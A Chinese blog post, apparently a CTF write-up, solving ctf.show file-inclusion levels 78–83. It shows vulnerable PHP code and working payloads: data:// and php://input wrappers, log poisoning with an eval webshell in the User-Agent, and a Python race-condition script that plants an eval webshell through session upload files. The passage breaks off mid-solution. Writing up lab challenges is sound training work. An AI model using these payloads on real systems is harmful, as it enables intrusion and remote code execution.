<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Ctf-Show-WEB文件包含专题 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Ctf-Show-WEB文件包含专题" />
<meta property="og:description" content="文件包含(WEB78-117) WEB 78 &lt;?php if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; include($file); }else{ highlight_file(__FILE__); } 法1：
关键部分为include 这里的$file 可由get传参控制，由于没有过滤所以这里方法较多。
使用data协议可以很直观有条理的获得flag
?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt; 可以获取当前目录文件发现有一个flag.php ?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt; 即可读取flag.php的中的内容。 法2:
先尝试 ?file=…/…/flag.php 结果提示文件不能包含。
再尝试 ?file=flag.php 结果 就什么也不显示（至少包含文件 已经成功），说明，有flag.php
这时，可使用?file=php://filter/read=convert.base64-encode/resource=flag.php
这时，显示出来一段base64代码 进行解码后。发现其中一段：
$flag=&#34;ctfshow{6601f516-c571-468b-8c49-611a1f194f84}&#34;; 原来flag.php只是赋了一个值 ，怪不得包含以后，页面什么也不显示。
至此，已获得flag
WEB 79 &lt;?php if(isset($_GET[&#39;file&#39;])){ $file = $_GET[&#39;file&#39;]; $file = str_replace(&#34;php&#34;, &#34;???&#34;, $file); include($file); }else{ highlight_file(__FILE__); } 方法1：
本关对传入的参数进行过滤，过滤掉了php但是不影响使用上一关的方法。经历过命令执行题目的折磨轻松可以绕过。
?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt; 可以获取当前目录文件发现有一个flag.php
?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt; 即可读取flag.php的中的内容。
方法2：
增加了 str_replace 函数 将 “php” 替换为 “?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/b5012253edf8338a3bd4904e0014db1b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-10-07T11:42:28+08:00" />
<meta property="article:modified_time" content="2023-10-07T11:42:28+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Ctf-Show-WEB文件包含专题</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="WEB78117_0"></a>文件包含(WEB78-117)</h2> 
<h3><a id="WEB_78_1"></a>WEB 78</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 关键部分为include 这里的$file 可由get传参控制，由于没有过滤所以这里方法较多。<br> 使用data协议可以很直观有条理的获得flag</p> 
<pre><code class="prism language-bash">?file<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span> 可以获取当前目录文件发现有一个flag.php
?file<span class="token operator">=</span>data://text/plain,<span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'tac flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span> 即可读取flag.php的中的内容。
</code></pre> 
<p>法2:<br> 先尝试 ?file=…/…/flag.php 结果提示文件不能包含。<br> 再尝试 ?file=flag.php 结果 就什么也不显示（至少包含文件 已经成功），说明，有flag.php<br> 这时，可使用<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br> 这时，显示出来一段base64代码 进行解码后。发现其中一段：</p> 
<pre><code class="prism language-bash"><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"ctfshow{6601f516-c571-468b-8c49-611a1f194f84}"</span><span class="token punctuation">;</span>
</code></pre> 
<p>原来flag.php只是赋了一个值 ，怪不得包含以后，页面什么也不显示。<br> 至此，已获得flag</p> 
<h3><a id="WEB_79_33"></a>WEB 79</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>方法1：<br> 本关对传入的参数进行过滤，过滤掉了php但是不影响使用上一关的方法。经历过命令执行题目的折磨轻松可以绕过。<br> ?file=data://text/plain,&lt;?=system('ls');?&gt; 可以获取当前目录文件发现有一个flag.php<br> ?file=data://text/plain,&lt;?=system('tac flag*');?&gt; 即可读取flag.php的中的内容。</p> 
<p>方法2：<br> 增加了 str_replace 函数 将 “php” 替换为 “???”<br> 法一：input协议 大小写绕过<br> payload:<br> POST /?file=Php://input HTTP/1.1</p> &lt;?Php system("ls");?&gt; 
<p>POST /?file=Php://input HTTP/1.1</p> &lt;?Php system("cat flag.php");?&gt; 
<p>#仅需在请求行 大写即可</p> 
<p>法二: data协议 + 利用php性质绕过<br> payload:<br> ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== # &lt;?php phpinfo(); ?file=data://text/plain,&lt;?= `tac f*`;?&gt;<br> ?file=data://text/plain,&lt;?Php echo `tac f*`;?&gt; # 可以无 ；</p> &lt;?php ?&gt; :php默认的开始、结束标签 &lt;? ?&gt; :需要开启short_open_tag ，即short_open_tag = On。 &lt;%%&gt; :需要开启asp_tags ，即asp_tags = On。 &lt;?= ?&gt; :用于输出，等同于- 可以直接使用 &lt;%= %&gt; :用于输出，等同于- ，需要开启asp_tags ，才可以使用 short_open_tag控制的是&lt;? ?&gt;标签。而并非&lt;?= ?&gt;标签，&lt;?= ?&gt;标签用于输出变量。当开启short_open_tag，&lt;? ?&gt; 功能和&lt;?php ?&gt; 一样。 php中代码开始标志类型(,,,&lt;% %&gt;,&lt;%= %&gt;) 
<br> 法三：data协议 base64 加密 payload: /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw== # &lt;?php system('ls'); /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # &lt;?php system('cat flag.php'); 
<pre><code class="prism language-bash"><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"ctfshow{215c725c-f7c4-4a46-ade0-9ca97ff4245f}"</span><span class="token punctuation">;</span>
</code></pre> 
<h3><a id="WEB_80_75"></a>WEB 80</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 本关过滤了php和data应该是不允许使用伪协议，但是可以正常包含，采用包含日志文件的方式。</p> 
<p>日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行</p> 
<p>GET /?file=/var/log/nginx/access.log HTTP/1.1<br> Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show<br> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[2]);?&gt;<br> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br> Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br> Accept-Encoding: gzip, deflate<br> DNT: 1<br> Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c<br> Connection: close<br> 可以直接命令执行即可也可以用webshell后门工具连接</p> 
<p>?file=/var/log/nginx/access.log&amp;2=system(‘ls /var/www/html’);phpinfo();</p> 
<p>?file=/var/log/nginx/access.log&amp;2=system(‘tac /var/www/html/fl0g.php’);phpinfo();</p> 
<p>寻找PHPinfo信息前面的那一段信息即可找到</p> 
<p>法2：<br> 对于php 和data 已经被过滤掉了，所以都不能用， 但是用POST 的方法，还能用，为了不被过滤，php://input 改成PHP://input GET 方法改为POST方法 最后添加一行，内容是需要包含的php代码 。这里目的 是为了执行 第一次，执行为：</p> 
<p>POST /?file=PHP://input HTTP/1.1</p> 
<p>Host: c3eaec6b-ca02-47ac-9577-2d884543b828.challenge.ctf.show User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 39</p> 
<p>#《？ php system(‘ls *.php’);？》 （是小尖括号哦）</p> 
<p>结果 显示 有2个文件 ，一是fl0g.php 另一个是index.php 再来一次，这次直接显示 fl0g.php</p> 
<p>POST /?file=PHP://input HTTP/1.1</p> 
<p>Host: c3eaec6b-ca02-47ac-9577-2d884543b828.challenge.ctf.show User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Content-Length: 39</p> 
<p>#《？php system(‘tac fl0g.php’);？》 是小尖括号哦</p> 
<p>这时可显示出fl0g.php 的内容 了。 有一行。 $flag=“ctfshow{13337e9c-4986-40c9-ae31-f44bcc68e9a1}”; 即获得flag</p> 
<pre><code class="prism language-bash"><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"ctfshow{13337e9c-4986-40c9-ae31-f44bcc68e9a1}"</span><span class="token punctuation">;</span> 
</code></pre> 
<h3><a id="WEB_81_134"></a>WEB 81</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> 在php和data 还有php://input 失效的情况下 还可以有日志信息。 在url 后加入日志文件 url?file=/var/log/nginx/access.log</p> 
<p>页面上直接包含了访问日志信息。 然后，加将其发送至repeater中， 第一次 将User-Agent的值 改为：《？php system(‘ls’);？》 （此处是小尖括号哦） 发送2次，将得到： <code>172.12.0.6 - - [04/Apr/2023:14:43:42 +0000] "GET / HTTP/1.1" 200 2741 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" 172.12.0.6 - - [04/Apr/2023:14:43:42 +0000] "GET /favicon.ico HTTP/1.1" 200 2741 "http://1e5d2acb-dcfa-41e3-a2c4-a2fe27b7a53d.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" 172.12.0.6 - - [04/Apr/2023:14:44:10 +0000] "GET /?file=/var/log/nginx/access.log HTTP/1.1" 200 399 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" 172.12.0.6 - - [04/Apr/2023:14:46:07 +0000] "GET /?file=/var/log/nginx/access.log HTTP/1.1" 200 586 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" 172.12.0.6 - - [04/Apr/2023:14:47:11 +0000] "GET / HTTP/1.1" 200 2741 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0" 172.12.0.6 - - [04/Apr/2023:14:48:17 +0000] "GET /?file=/var/log/nginx/access.log HTTP/1.1" 200 930 "-" "fl0g.php index.php</code><br> 可以看到文件有两个，一为名为fl0g.php ，另一为index.php<br> 将User-Agent的值 改为：《？php system(‘cat fl0g.php’);？》（此处是小尖括号哦） 也发送2次，将得到。<br> 前面部分内容省略，和上面一样。<br> /* 。。。。。 */<br> $flag=“ctfshow{dd09afcc-9325-42d5-9079-e063e78d72b4}”;"<br> 即得到flag</p> 
<pre><code class="prism language-bash"><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"ctfshow{dd09afcc-9325-42d5-9079-e063e78d72b4}"</span><span class="token punctuation">;</span>"
</code></pre> 
<h3><a id="WEB_82_163"></a>WEB 82</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：<br> https://www.freebuf.com/vuls/202819.html 这道题有点像wmctf的make php great again 利用session对话进行文件包含利用 https://blog.csdn.net/qq_46091464/article/details/108021053</p> 
<p>法2：<br> 条件竞争：https://www.freebuf.com/articles/web/275557.html session利用的小思路：https://xz.aliyun.com/t/10662</p> 
<h3><a id="WEB_83_184"></a>WEB 83</h3> 
<pre><code class="prism language-php">
Warning<span class="token punctuation">:</span> <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">Trying</span> to destroy uninitialized session in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span>php on line <span class="token number">14</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>法1：</p> 
<pre><code class="prism language-bash">来自于网上的强大 脚本

<span class="token function">import</span> requests

<span class="token function">import</span> io

<span class="token function">import</span> threading

url <span class="token operator">=</span> <span class="token string">'http://6733cf0a-5d30-4a8d-b3bf-eddcef8aaa55.challenge.ctf.show/'</span> <span class="token comment"># 改成自己的url</span>

sessionid <span class="token operator">=</span> <span class="token string">'truthahn'</span> <span class="token comment"># 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn</span>

cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

        <span class="token string">'PHPSESSID'</span>:sessionid

    <span class="token punctuation">}</span>
def write<span class="token punctuation">(</span>session<span class="token punctuation">)</span>: <span class="token comment"># write()函数用于写入session临时文件</span>

fileBytes <span class="token operator">=</span> io.BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span>*1024*50<span class="token punctuation">)</span>

data2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

    <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token builtin class-name">:</span><span class="token string">'&lt;?=eval($_POST[1])?&gt;'</span>    <span class="token comment"># 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话</span>

<span class="token punctuation">}</span>

files <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

    <span class="token string">'file'</span>:<span class="token punctuation">(</span><span class="token string">'truthahn.jpg'</span>,fileBytes<span class="token punctuation">)</span>

<span class="token punctuation">}</span>

<span class="token keyword">while</span> True:    

    res <span class="token operator">=</span> session.post<span class="token punctuation">(</span>url,data<span class="token operator">=</span>data2,cookies<span class="token operator">=</span>cookies,files<span class="token operator">=</span>files<span class="token punctuation">)</span>

    print<span class="token punctuation">(</span>res.text<span class="token punctuation">)</span>

    print<span class="token punctuation">(</span><span class="token string">'======= write done! ======'</span><span class="token punctuation">)</span>
def read<span class="token punctuation">(</span>session<span class="token punctuation">)</span>: <span class="token comment"># read()函数利用session临时文件生成一句话木马，实现rce</span>

data1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>

    <span class="token string">"1"</span><span class="token builtin class-name">:</span><span class="token string">"file_put_contents('/var/www/html/4.php','&lt;?=eval(<span class="token variable">$_POST</span>[2]);?&gt;');"</span>     <span class="token comment"># 使用file_put_contents()php内置函数生成名为3.php的shell文件</span>

<span class="token punctuation">}</span>

<span class="token keyword">while</span> True:

    res <span class="token operator">=</span> session.post<span class="token punctuation">(</span>url+<span class="token string">'?file=/tmp/sess_'</span>+sessionid,data<span class="token operator">=</span>data1,cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>

    print<span class="token punctuation">(</span>res.text<span class="token punctuation">)</span>

    res2 <span class="token operator">=</span> session.get<span class="token punctuation">(</span>url+<span class="token string">'4.php'</span><span class="token punctuation">)</span>

    print<span class="token punctuation">(</span>res2.text<span class="token punctuation">)</span>

    <span class="token keyword">if</span> res2.status_code <span class="token operator">==</span> <span class="token number">200</span>:     <span class="token comment">#若3.php成功生成，则返回Done!，否则返回失败的状态码</span>

        print<span class="token punctuation">(</span><span class="token string">'++++++++ Done! +++++++++'</span><span class="token punctuation">)</span>

    else:

        print<span class="token punctuation">(</span>res2.status_code<span class="token punctuation">)</span>
<span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'main'</span><span class="token builtin class-name">:</span>

event <span class="token operator">=</span> threading.Event<span class="token punctuation">(</span><span class="token punctuation">)</span>       

with requests.session<span class="token punctuation">(</span><span class="token punctuation">)</span> as session:     <span class="token comment"># 为每个函数设置5个线程并发执行</span>

    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>:

        print<span class="token punctuation">(</span><span class="token string">'*'</span>*50<span class="token punctuation">)</span>

        threading.Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write,args<span class="token operator">=</span><span class="token punctuation">(</span>session,<span class="token punctuation">))</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>:

        print<span class="token punctuation">(</span><span class="token string">'='</span>*50<span class="token punctuation">)</span>

        threading.Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read,args<span class="token operator">=</span><span class="token punctuation">(</span>session,<span class="token punctuation">))</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span>

event.set<span class="token punctuation">(</span><span class="token punctuation">)</span>
执行后，打开 url/4.php 。并POST 上

第一次

<span class="token assign-left variable">2</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

第二次

<span class="token assign-left variable">2</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'tac fl0g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

获得flag
</code></pre> 
<p>法2：</p> 
<pre><code class="prism language-bash"><span class="token comment">#poc.php</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">"ip地址"</span> <span class="token assign-left variable">method</span><span class="token operator">=</span><span class="token string">"POST"</span> <span class="token assign-left variable">enctype</span><span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">&gt;</span>
